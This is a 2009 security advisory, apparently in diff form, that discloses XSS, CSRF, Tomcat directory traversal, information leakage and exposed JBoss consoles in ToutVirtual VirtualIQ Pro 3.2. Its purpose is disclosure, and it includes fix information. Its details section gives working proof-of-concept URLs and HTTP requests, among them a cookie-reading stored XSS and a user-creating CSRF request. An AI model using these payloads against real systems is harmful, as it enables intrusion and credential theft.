@@ -1,0 +1,174 @@
+&redirectSecure Network - Security Research Advisory
+
+Vuln name: ToutVirtual VirtualIQ Pro Multiple Vulnerabilities
+Systems affected: ToutVirtual VirtualIQ Professional 3.2 build 7882
+Systems not affected: --
+Severity: High
+Local/Remote: Remote
+Vendor URL: http://www.toutvirtual.com
+Author(s): Alberto Trivero (a.trivero (at) securenetwork (dot) it [email concealed]) 
+Claudio Criscione (c.criscione (at) securenetwork (dot) it [email concealed])
+Vendor disclosure: 02/07/2009
+Vendor acknowledged: 16/07/2009
+Vendor patch release: notified us on 06/11/2009
+Public disclosure: 07/11/2009
+Advisory number: SN-2009-02
+Advisory URL: http://www.securenetwork.it/advisories/sn-2009-02.txt
+
+*** SUMMARY ***
+
+ToutVirtual's VirtualIQ Pro is specifically designed for IT administrators 
+responsible for managing virtual platforms. VirtualIQ Pro provides
+Visibility, Analytics and policy-based Optimization - all from one single
+console. VirtualIQ Pro is hypervisor-agnostic supporting both Type I and Type 
+II hypervisors. VirtualIQ Pro can be used to visualize, analyze and 
+optimize your choice of virtualization platform - Citrix, Microsoft,
+Novell, Oracle and/or VMware.
+
+Multiple vulnerabilities has been found which a allow an attacker to conduct 
+various XSS and CSRF attack, and other attacks due to the use 
+of an old an not hardened version of the web server.
+
+*** VULNERABILITY DETAILS ***
+
+(a) Cross-site scripting (XSS)
+
+Due to an improper sanitization of user's input, multiple XSS attacks 
+(reflective and stored) are possible.
+Reflective PoCs:
+
+http://server:9080/tvserver/server/user/setPermissions.jsp?userId=1"><sc
+ript>alert(1)</script>&resultResourceIds=111-222-1933email (at) address (dot) t [email concealed]
+st
+
+http://server:9080/tvserver/server/user/addDepartment.jsp?addNewDept=0&a
+mp;deptName=%22;alert(1);//&deptId=1&deptDesc=asd
+
+http://server:9080/tvserver/server/inventory/inventoryTabs.jsp?ID=1;aler
+t(1);//
+
+http://server:9080/tvserver/reports/virtualIQAdminReports.do?command=get
+Filter&reportName=%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+
+Stored XSS attacks can be triggered in the "Middle Name" parameter in the 
+"Edit Profile" page with an HTTP request like the following:
+
+POST /tvserver/user/user.do?command=save&userId=1 HTTP/1.1
+Host: server:9080
+Cookies: JSESSIONID=[...]
+
+userName=IQMANAGER&firstName=IQ&middleName=asd'; 
+alert(document.cookie);//&lastName=MANAGER&email=user%40domain.it&passwo
+rd=********&retypePassword=********&redirect=null&passwordModifed=false&
+isReportUser=false&roleId=1&supervisorId=1&departmentId=1&locationId=1
+
+(b) Cross-site request forgery (CSRF)
+
+An attacker can perform different types of CSRF attacks against a logged user. 
+He can, for example, shutdown, start or restart an arbitrary
+virtual machine, schedule new activities and so on.
+
+The following HTTP request, if forged by the attacker and executed by the 
+victim while logged on VirtualIQ, creates an arbitrary user:
+
+POST /tvserver/user/user.do?command=save&userId= HTTP/1.1
+Host: server:9080
+Cookie: JSESSIONID=[...]
+
+userName=asd1&firstName=asd2&middleName=asd3&lastName=asd4&email=asd5%40
+asd.com&password=asd6&retypePassword=asd6=null&passwordModifed=
+false&isReportUser=false&roleId=1&supervisorId=1&departmentId=1&location
+Id=1
+
+(c) Web server vulnerabilities
+
+VirtualIQ runs on top of an old version of Apache Tomcat: 5.5.9, for which 
+multiple public vulnerabilities have been released. As a 
+PoC, a directory traversal attack (CVE-2008-2938) 
+can be performed as:
+
+http://server:9080/tvserver/server/%C0%AE%C0%AE/WEB-INF/web.xml
+
+Listing of an arbitrary directory (CVE-2006-3835) can also be obtained with 
+the following PoC:
+
+http://192.168.229.85:9080/tvserver/server/;index.jsp
+
+(d) Information Leakage
+
+Tomcat status page should be disabled or restricted, being accessible at:
+
+http://status:9080/status
+
+Username and password to access a VM through SSH are also available in clear 
+text in the configuration page. 
+Since an XSS vulnerability can also be triggered in the same page, an attacker 
+would also be able to easily capture the full credentials to access 
+the VM with a specially crafted XSS payload.
+
+(e) Remote code execution
+
+JBoss JMX Management Console is exposed and can be used by remote attackers to 
+execute arbitrary commands on the system:
+
+http://server:9080/jmx-console/
+
+JBoss Web Console is exposed as well and can be used by remote attackers to 
+execute any command on the system:
+
+http://server:9080/web-console/
+
+*** EXPLOIT ***
+
+Attackers may exploit these issues through a common browser as explained 
+above.
+
+*** FIX INFORMATION ***
+
+Upgrade to the latest version, at the moment 3.5 build 10.14.2009
+
+*** WORKAROUNDS ***
+
+--
+
+*********************
+*** LEGAL NOTICES ***
+*********************
+
+Secure Network (www.securenetwork.it) is an information security company, 
+which provides consulting and training services, and engages in security 
+research and development.
+
+We are committed to open, full disclosure of vulnerabilities, cooperating
+whenever possible with software developers for properly handling disclosure.
+
+This advisory is copyright 2009 Secure Network S.r.l. Permission is 
+hereby granted for the redistribution of this alert, provided that it is
+not altered except by reformatting it, and that due credit is given. It 
+may not be edited in any way without the express consent of Secure Network 
+S.r.l. Permission is explicitly given for insertion in vulnerability 
+databases and similars, provided that due credit is given to Secure Network.
+
+The information in the advisory is believed to be accurate at the time of 
+publishing based on currently available information. This information is
+provided as-is, as a free service to the community by Secure Network 
+research staff. There are no warranties with regard to this information. 
+Secure Network does not accept any liability for any direct, indirect,
+or consequential loss or damage arising from use of, or reliance on,
+this information.
+
+If you have any comments or inquiries, or any issue with what is reported 
+in this advisory, please inform us as soon as possible.
+
+E-mail: securenetwork (at) securenetwork (dot) it [email concealed]
+GPG/PGP key: http://www.securenetwork.it/pgpkeys/Secure%20Network.asc
+Phone: +39 02 24 12 67 88
+
+-- 
+Claudio Criscione
+
+Secure Network S.r.l.
+Via Venezia, 23 - 20099 Sesto San Giovanni (MI) - Italia
+Tel: +39 02.24126788 Mob: +39 392 3389178
+email: c.criscione (at) securenetwork (dot) it [email concealed]
+web: www.securenetwork.it
